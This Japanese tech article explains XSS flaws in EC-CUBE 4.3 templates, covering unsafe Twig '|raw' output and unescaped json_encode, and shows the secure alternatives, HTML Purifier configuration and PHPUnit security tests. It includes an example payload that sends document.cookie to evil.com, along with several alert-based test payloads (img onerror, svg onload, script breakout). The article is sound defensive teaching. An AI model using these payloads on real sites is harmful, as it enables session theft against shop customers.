---
title: "EC-CUBEのXSS脆弱性を深掘りする - Twigテンプレートとjson_encodeの落とし穴"
emoji: "🔓"
type: "tech"
topics: ["eccube", "eccube4", "php", "security", "xss"]
published: true
---

:::message
この記事は EC-CUBE 4.3 以上を対象としています。
また、[Claude Code](https://claude.ai/claude-code) を使って書かれています。内容に誤りがある場合はコメントでお知らせください。
:::

EC-CUBEでプラグインやカスタマイズを行う際、XSS（クロスサイトスクリプティング）対策は最も注意すべきセキュリティ項目の一つです。この記事では、EC-CUBEで実際に発見されたXSS脆弱性のパターンを解説し、安全なコードの書き方を紹介します。

## XSSとは

XSS（Cross-Site Scripting）は、Webアプリケーションの脆弱性を利用して、悪意のあるスクリプトをユーザーのブラウザで実行させる攻撃です。

### XSSの種類

| 種類 | 説明 | 例 |
|------|------|-----|
| **反射型XSS** | URLパラメータなどの入力がそのまま表示される | 検索クエリの表示 |
| **格納型XSS** | DBに保存されたデータが表示される | 商品説明、ニュース |
| **DOM-based XSS** | JavaScriptでDOMを操作する際に発生 | クライアントサイドのURL解析 |

EC-CUBEでは特に**格納型XSS**が危険です。管理者が入力したデータが顧客に表示されるため、管理者アカウントが侵害された場合、全顧客に影響が及びます。

## EC-CUBEで発見されたXSS脆弱性パターン

### パターン1: `|raw` フィルターの不適切な使用

Twigテンプレートでは、デフォルトで出力がHTMLエスケープされます。しかし、HTMLを許可したい場合に `|raw` フィルターを使うと、XSS脆弱性が生まれます。

#### 脆弱なコード

```twig
{# 危険: HTMLがそのまま出力される #}
{{ Product.description_detail|raw|nl2br }}
```

この書き方では、商品説明に以下のようなコードを入力すると、顧客のブラウザでスクリプトが実行されます。

```html
<script>document.location='https://evil.com/?cookie='+document.cookie</script>
```

#### 影響を受けていた箇所

| ファイル | 対象フィールド |
|---------|----------------|
| `default/Product/detail.twig` | `Product.description_detail` |
| `default/Product/list.twig` | `Product.description_list` |
| `default/Block/news.twig` | `News.description` |
| `default/Help/tradelaw.twig` | `tradelaw.description` |
| `default/Shopping/index.twig` | `activeTradeLaw.description` |
| `default/Shopping/confirm.twig` | `activeTradeLaw.description` |

#### 安全なコード

EC-CUBEには `|purify` フィルターが用意されています。これはHTML Purifierを使って危険なタグや属性を除去します。

```twig
{# 安全: HTML Purifierでサニタイズしてから出力 #}
{{ Product.description_detail|purify|nl2br }}
```

:::message alert
`|raw` を使う場合は、必ず `|purify` と組み合わせてください。
:::

### パターン2: JSON出力のエスケープ不足

JavaScriptにデータを渡すためにJSON出力する際も、XSS脆弱性が発生する可能性があります。

#### 脆弱なコード

```php
// 危険: エスケープオプションなし
return json_encode($categories);
```

```twig
<script>
var categories = {{ categories_json|raw }};
</script>
```

この場合、カテゴリ名に `</script><script>alert('XSS')</script>` が含まれていると、スクリプトコンテキストを脱出してXSS攻撃が可能になります。

#### 影響を受けていた箇所

| ファイル | 問題箇所 |
|---------|----------|
| `EccubeExtension.php` | `getClassCategoriesAsJson()` |
| `FileController.php` | 複数の `json_encode()` 呼び出し |
| `EditController.php` | `shippingDeliveryTimes` のJSON出力 |
| `ShippingController.php` | `shippingDeliveryTimes` のJSON出力 |

#### 安全なコード

`json_encode()` にセキュリティオプションを追加します。

```php
// 安全: 特殊文字をエスケープ
return json_encode($categories, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
```

このオプションにより、以下の変換が行われます。

| 文字 | 変換後 |
|------|--------|
| `<` | `\u003C` |
| `>` | `\u003E` |
| `&` | `\u0026` |
| `'` | `\u0027` |
| `"` | `\u0022` |

これにより、`</script>` が `\u003C/script\u003E` に変換され、スクリプトコンテキストの脱出を防げます。

## プラグイン開発者が注意すべきポイント

### 1. Twigテンプレートでの出力

```twig
{# ❌ 危険 #}
{{ user_input|raw }}

{# ✅ 安全: デフォルトのエスケープを使う #}
{{ user_input }}

{# ✅ 安全: HTMLを許可する場合はpurifyを使う #}
{{ html_content|purify }}

{# ✅ 安全: 属性値にはe('html_attr')を使う #}
<div data-value="{{ user_input|e('html_attr') }}">
```

### 2. JavaScriptへのデータ渡し

```twig
{# ❌ 危険 #}
<script>
var data = {{ data|json_encode|raw }};
</script>

{# ✅ 安全: json_encodeのエスケープオプションを使う #}
<script>
var data = {{ data|json_encode(constant('JSON_HEX_TAG') b-or constant('JSON_HEX_AMP') b-or constant('JSON_HEX_APOS') b-or constant('JSON_HEX_QUOT'))|raw }};
</script>
```

### 3. PHPでのJSON出力

```php
// ❌ 危険
return $this->json($data);

// ✅ 安全: JsonResponseのオプションを指定
return new JsonResponse($data, 200, [], JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
```

### 4. FormExtensionでの属性追加

```php
// ❌ 危険: ユーザー入力をそのまま属性に
$builder->add('name', TextType::class, [
    'attr' => [
        'data-value' => $userInput, // エスケープされない可能性
    ],
]);

// ✅ 安全: Symfonyのフォームシステムが自動エスケープ
// ただし、JavaScriptで使用する場合は注意
```

## HTML Purifierの設定

EC-CUBEの `|purify` フィルターはHTML Purifierを使用しています。デフォルト設定では以下のタグが許可されています。

```php
// EccubeExtension.php
$tagList = 'h1,h2,h3,h4,h5,h6,div,p,pre,code,span,br,a,img,table,thead,tbody,tr,th,td,ul,ol,li,dl,dt,dd,em,strong,b,i,u,s,sub,sup,blockquote,hr';
```

### カスタマイズ例

プラグインで独自のPurify設定を使いたい場合：

```php
<?php

namespace Plugin\YourPlugin\Twig\Extension;

use HTMLPurifier;
use HTMLPurifier_Config;
use Twig\Extension\AbstractExtension;
use Twig\TwigFilter;

class PurifyExtension extends AbstractExtension
{
    public function getFilters(): array
    {
        return [
            new TwigFilter('custom_purify', [$this, 'customPurify'], ['is_safe' => ['html']]),
        ];
    }

    public function customPurify(?string $html): string
    {
        if ($html === null) {
            return '';
        }

        $config = HTMLPurifier_Config::createDefault();

        // 許可するタグを制限
        $config->set('HTML.Allowed', 'p,br,strong,em,a[href]');

        // 外部リンクにrel="noopener"を追加
        $config->set('HTML.Nofollow', true);

        // iframeを禁止（デフォルトで禁止だが明示的に）
        $config->set('HTML.SafeIframe', false);

        $purifier = new HTMLPurifier($config);

        return $purifier->purify($html);
    }
}
```

## セキュリティテストの方法

### 1. 手動テスト

以下のペイロードを入力フィールドに入力し、スクリプトが実行されないことを確認します。

```html
<!-- 基本的なXSSペイロード -->
<script>alert('XSS')</script>

<!-- イベントハンドラを使ったXSS -->
<img src=x onerror="alert('XSS')">

<!-- SVGを使ったXSS -->
<svg onload="alert('XSS')">

<!-- JSON脱出 -->
</script><script>alert('XSS')</script>
```

### 2. 自動テスト

PHPUnitでXSS対策をテストする例：

```php
<?php

namespace Plugin\YourPlugin\Tests;

use Eccube\Tests\Web\AbstractWebTestCase;

class XssSecurityTest extends AbstractWebTestCase
{
    public function testProductDescriptionIsSanitized(): void
    {
        // 管理者としてログイン
        $this->loginAsAdmin();

        // XSSペイロードを含む商品を作成
        $Product = $this->createProduct();
        $Product->setDescriptionDetail('<script>alert("XSS")</script>');
        $this->entityManager->flush();

        // 商品詳細ページを取得
        $crawler = $this->client->request('GET', '/products/detail/' . $Product->getId());

        // スクリプトタグが除去されていることを確認
        $html = $this->client->getResponse()->getContent();
        $this->assertStringNotContainsString('<script>', $html);
    }

    public function testJsonOutputIsEscaped(): void
    {
        $this->loginAsAdmin();

        // カテゴリ名にXSSペイロードを設定
        $Category = $this->createCategory();
        $Category->setName('</script><script>alert("XSS")</script>');
        $this->entityManager->flush();

        // APIエンドポイントを取得
        $this->client->request('GET', '/api/categories');
        $content = $this->client->getResponse()->getContent();

        // </script>が直接出力されていないことを確認
        $this->assertStringNotContainsString('</script>', $content);
    }
}
```

## まとめ

EC-CUBEでXSS脆弱性を防ぐためのポイント：

| 状況 | 対策 |
|------|------|
| テンプレートでの出力 | デフォルトのエスケープを使う。HTMLを許可する場合は `\|purify` を使う |
| JSON出力 | `json_encode()` に `JSON_HEX_TAG \| JSON_HEX_AMP` などのオプションを追加 |
| 属性値への出力 | `\|e('html_attr')` を使う |
| JavaScriptへのデータ渡し | Twigの `json_encode` フィルターにオプションを指定 |

**覚えておくべき原則：**

1. **`|raw` は最後の手段** - 本当に必要な場合のみ使い、必ず `|purify` と組み合わせる
2. **ユーザー入力を信用しない** - 管理者入力も含めて、すべての入力をサニタイズする
3. **コンテキストに応じたエスケープ** - HTML、属性、JavaScript、URLなど、出力先に応じた適切なエスケープを行う

## 参考リンク

- [EC-CUBE Issue #6634](https://github.com/EC-CUBE/ec-cube/issues/6634)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [HTML Purifier](http://htmlpurifier.org/)
- [Twig Escaper Extension](https://twig.symfony.com/doc/3.x/filters/escape.html)

---

:::message alert
**EC-CUBEのカスタマイズをお待ちしております！**

EC-CUBEのカスタマイズや開発のご相談は、お気軽にお問い合わせください。

この記事が役に立ったら、ぜひ**バッジを贈っていただけると励みになります！**
:::
